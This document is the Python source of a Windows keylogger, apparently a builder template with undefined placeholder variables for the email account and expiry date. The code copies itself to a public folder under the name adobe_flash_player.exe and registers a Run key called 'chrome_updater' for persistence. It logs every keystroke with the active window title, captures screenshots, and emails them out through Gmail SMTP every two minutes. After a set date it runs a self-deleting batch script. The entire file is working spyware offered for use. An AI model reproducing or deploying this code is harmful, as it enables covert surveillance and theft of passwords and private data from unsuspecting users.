from keyboard import on_press, wait
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders
from win32gui import GetWindowText, GetForegroundWindow
import win32event, win32api, winerror
from datetime import datetime
from threading import Thread
from time import sleep
import mss
import mss.tools
import smtplib
import sys
import shutil
from winreg import *
import os



instance = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    instance = None
    exit()    

dir = r"C:\Users\Public\Libraries\adobe_flash_player.exe"

def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"chrome_updater", 0, REG_SZ, dir)    
if not os.path.isfile(dir):
    startup()   


if (dst <= str(datetime.now())[:10]):
    pth = r"del /q C:\Users\Public\Libraries\adobe_flash_player.exe"
    dlt = r"del /q C:\Users\Public\Libraries\del.cmd"
    f = open(r"C:\Users\Public\Libraries\del.cmd","w+")
    f.write('''
taskkill /f /im "adobe_flash_player.exe" ''' +  '\n' + pth + '\n' + '''
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v chrome_updater /f
''' + '\n' + dlt)    
    f.close()
    os.system(r"C:\Users\Public\Libraries\del.cmd")
else:
    pass    


data = ''
lastwindow = ''

def Screenshot():    
    with mss.mss() as sct:
    	monitor = sct.monitors[1]
    	im = sct.grab(monitor)
    	raw_bytes = mss.tools.to_png(im.rgb, im.size)
    return raw_bytes

def send_mail():
    global data,lastwindow
    while True:
        if len(data) > 20:
            timeInSecs = datetime.now()
            PASS = PAS
            FROM = FRM
            TO = FRM
            SUBJECT = "ABSORBER"
            MESSAGE =  '<span style="color:#0000FF">' + ' [' + lastwindow + '] ' + '</span>'+ data 
            msg = MIMEMultipart()
            msg.attach(MIMEText(MESSAGE, 'html'))
            MimeImg = MIMEImage(Screenshot())
            MimeImg.add_header('Content-Disposition', 'attachment', filename="screenshot.png")
            msg.attach(MimeImg)
            text = msg.as_string()
            try:
                server = smtplib.SMTP("smtp.gmail.com",587)
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(FROM, PASS)
                server.sendmail(FROM, TO, text)
                lastwindow = ''
                data = ''
                MESSAGE = ''
                text = ''
                msg = ''
                server.quit()
            except Exception as error:
                print(error)
        sleep(120)


def display(event, key):
    global data, lastwindow
    if lastwindow != GetWindowText(GetForegroundWindow()):
        lastwindow = GetWindowText(GetForegroundWindow())
        #data += ' [ ' + lastwindow + ' ] '
        if key == 'tab' or key == 'caps lock' or key == 'shift' or key == 'ctrl' or key == 'alt' or key == 'space' or key == 'right alt' or key == 'right ctrl' or key == 'esc' or key == 'left' or key == 'right' or key == 'down' or key == 'up' or key == 'right shift' or key == 'enter' or key == 'backspace' or key == 'num lock' or key == 'page up' or key == 'page down' or key == 'insert' or key == 'delete' or key == 'print screen' or key == 'home' or key == 'end' or key == 'decimal':
            data += ' { ' + str(key) + ' } '
        else:
            data += key    
    elif key == 'tab' or key == 'caps lock' or key == 'shift' or key == 'ctrl' or key == 'alt' or key == 'space' or key == 'right alt' or key == 'right ctrl' or key == 'esc' or key == 'left' or key == 'right' or key == 'down' or key == 'up' or key == 'right shift' or key == 'enter' or key == 'backspace' or key == 'num lock' or key == 'page up' or key == 'page down' or key == 'insert' or key == 'delete' or key == 'print screen' or key == 'home' or key == 'end' or key == 'decimal':
        data += ' { ' + str(key) + ' } '
    else:
        data += key
        
def KeyPressed(event):
    display(event, event.name)
    
    

if __name__ == '__main__':
    triggerThread = Thread(target=send_mail,daemon=True)
    triggerThread.start()

on_press(KeyPressed)
wait()
